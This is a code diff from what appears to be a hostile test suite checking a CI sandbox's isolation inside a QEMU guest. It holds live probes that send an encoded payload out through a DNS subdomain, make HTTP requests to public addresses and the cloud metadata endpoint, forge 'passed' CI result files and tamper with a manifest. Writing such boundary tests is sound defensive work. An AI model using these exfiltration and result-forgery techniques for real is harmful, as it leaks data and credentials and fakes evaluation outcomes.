@@ -102,16 +102,23 @@ const guestAgentWritable = insideQemuGuest
 // eslint-disable-next-line sonarjs/publicly-writable-directories -- Forging a guest-local result in /tmp is an explicit hostile boundary test.
 tryWriteProbe('/tmp/private-ci-result.json', '{"result":"passed","feedback":null}\n');
 tryWriteProbe('/work/private-ci-result.json', '{"result":"passed","feedback":null}\n');
-const dnsAvailable = await dns.resolve4(`${encodedPayload}.hostile-ci.invalid`).then(
-    addresses => addresses.length > 0,
-    () => false
-);
+const dnsAvailable = insideQemuGuest
+    && await dns.resolve4(`${encodedPayload}.hostile-ci.invalid`).then(
+        addresses => addresses.length > 0,
+        () => false
+    );
 // eslint-disable-next-line sonarjs/no-hardcoded-ip -- This fixed public endpoint tests IPv4 egress from the disposable guest.
-const ipv4Available = await connect('1.1.1.1', 80, 4, `GET /${encodedPayload} HTTP/1.0\r\n\r\n`);
+const ipv4ProbeHost = '1.1.1.1';
 // eslint-disable-next-line sonarjs/no-hardcoded-ip -- This fixed public endpoint tests IPv6 egress from the disposable guest.
-const ipv6Available = await connect('2606:4700:4700::1111', 80, 6, `GET /${encodedPayload} HTTP/1.0\r\n\r\n`);
+const ipv6ProbeHost = '2606:4700:4700::1111';
 // eslint-disable-next-line sonarjs/no-hardcoded-ip -- The link-local metadata address is the attack target under test.
-const metadataAvailable = await connect('169.254.169.254', 80, 4, `GET /${encodedPayload} HTTP/1.0\r\n\r\n`);
+const metadataProbeHost = '169.254.169.254';
+const ipv4Available = insideQemuGuest
+    && await connect(ipv4ProbeHost, 80, 4, `GET /${encodedPayload} HTTP/1.0\r\n\r\n`);
+const ipv6Available = insideQemuGuest
+    && await connect(ipv6ProbeHost, 80, 6, `GET /${encodedPayload} HTTP/1.0\r\n\r\n`);
+const metadataAvailable = insideQemuGuest
+    && await connect(metadataProbeHost, 80, 4, `GET /${encodedPayload} HTTP/1.0\r\n\r\n`);
 
 const manifest = JSON.parse(fs.readFileSync('src/manifest.json', 'utf8'));
 manifest.name = 'HOSTILE SUITE TAMPER MUST NOT PASS';
